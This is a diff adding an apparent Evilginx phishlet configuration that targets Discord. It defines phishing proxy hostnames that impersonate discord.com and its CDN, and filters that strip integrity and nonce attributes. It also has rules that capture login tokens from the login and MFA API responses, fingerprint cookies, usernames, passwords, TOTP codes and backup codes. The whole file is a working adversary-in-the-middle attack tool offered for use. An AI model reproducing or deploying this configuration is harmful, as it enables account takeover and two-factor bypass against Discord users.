@@ -1,0 +1,63 @@
+min_ver: '3.0.0'
+author: '0fukuAkz'
+
+proxy_hosts:
+  # Apex domain — orig_sub '' resolves to discord.com directly via combineHost
+  - {phish_sub: 'discord', orig_sub: '', domain: 'discord.com', session: true, is_landing: true, auto_filter: true}
+  # Media CDN — avatars, attachments
+  - {phish_sub: 'cdndiscord', orig_sub: 'cdn', domain: 'discordapp.com', session: false, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'discord.com', orig_sub: '', domain: 'discord.com', search: ' integrity="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'discord.com', orig_sub: '', domain: 'discord.com', search: ' integrity=''[^'']*''', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'discord.com', orig_sub: '', domain: 'discord.com', search: ' nonce="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'discord.com', orig_sub: '', domain: 'discord.com', search: ' nonce=''[^'']*''', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'discord.com', orig_sub: '', domain: 'discord.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'discord.com', orig_sub: 'cdn', domain: 'discordapp.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+auth_tokens:
+  # Discord auth token is returned in the JSON response body, not a cookie.
+  # Capture it from the /api/v9/auth/login response.
+  - domain: 'discord.com'
+    path: '/api/v9/auth/login'
+    name: 'token'
+    search: '"token":"([^"]*)"'
+    type: 'body'
+  # Fallback: MFA completion endpoint also returns the token
+  - domain: 'discord.com'
+    path: '/api/v9/auth/mfa/totp'
+    name: 'mfa_token'
+    search: '"token":"([^"]*)"'
+    type: 'body'
+  # Device fingerprint cookies (captured for session completeness)
+  - domain: '.discord.com'
+    keys: ['__dcfduid,opt', '__sdcfduid,opt', '__cfruid,opt', 'locale,opt', '__cf_bm,opt']
+    type: 'cookie'
+
+credentials:
+  # Discord sends JSON POST: {"login":"email","password":"pass","captcha_key":"..."}
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+  custom:
+    # TOTP 2FA code
+    - {key: 'code', search: '(.*)', type: 'post'}
+    # Backup code
+    - {key: 'ticket', search: '(.*)', type: 'post'}
+
+auth_urls:
+  - '/api/v9/auth/login'
+  - '/api/v9/auth/mfa/totp'
+  - '/api/v9/auth/mfa/sms'
+  - '/channels/.*'
+
+login:
+  domain: 'discord.com'
+  path: '/login'
